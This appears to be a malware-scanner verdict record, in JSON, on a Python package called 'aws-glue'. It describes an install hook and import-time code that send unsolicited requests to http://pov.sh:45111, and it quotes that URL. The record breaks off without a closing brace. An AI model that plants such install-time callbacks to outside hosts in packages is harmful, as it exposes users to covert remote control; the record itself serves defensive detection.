{
  "purpose": "Set up a Python package named 'aws-glue' with a custom installation process that makes an HTTP request during installation.",
  "sources": "The code reads data from an external URL via requests.get(\"http://pov.sh:45111/api/v3/aws-glue\") during module import and within the post_install() function called during package installation.",
  "sinks": "The external HTTP request can send data to the specified server; however, no data is explicitly extracted from untrusted sources within the code. The code does not seem to leak data but initiates outbound network communication.",
  "flows": "On import, the requests.get() executes immediately, sending a GET request to the specified URL. During installation, the post_install() function triggers another GET request to the same URL. These requests are source-to-sink flows initiating outbound network communication to a suspicious domain.",
  "anomalies": "The code makes unsolicited network requests to a suspicious domain (pov.sh:45111) both on import and during installation. No explanation or user confirmation is provided for these requests. No credentials or sensitive data are handled, but the repeated outbound requests are unusual and potentially malicious.",
  "analysis": "The script defines a setup for a Python package, with a custom install command that executes a network request to an external, suspicious domain both immediately upon import and during installation. This behavior suggests potential malicious activity, such as remote command execution or data exfiltration, especially since the domain is obscure and the request is made without user consent or context. There are no other malicious code or obfuscation indicators, but the external communication is suspicious and potentially malicious.",
  "conclusion": "The code contains malicious behavior due to unsolicited outbound network requests to a suspicious domain during import and installation. These requests could be used for malicious control, data exfiltration, or other harmful activities. The code appears intentionally designed to contact an external server covertly.",
